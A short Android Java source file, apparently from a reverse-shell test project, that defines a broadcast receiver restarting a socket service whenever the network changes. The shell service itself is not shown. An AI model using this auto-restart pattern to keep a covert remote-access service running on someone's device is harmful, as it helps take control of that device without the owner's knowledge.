package com.example.reverseshelltest;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class ChangeinNetwork extends BroadcastReceiver {


    @Override
    public void onReceive(Context context, Intent intent) {
        Intent reverseService = new Intent(context, SocketService.class);
        context.startService(reverseService);
    }
}
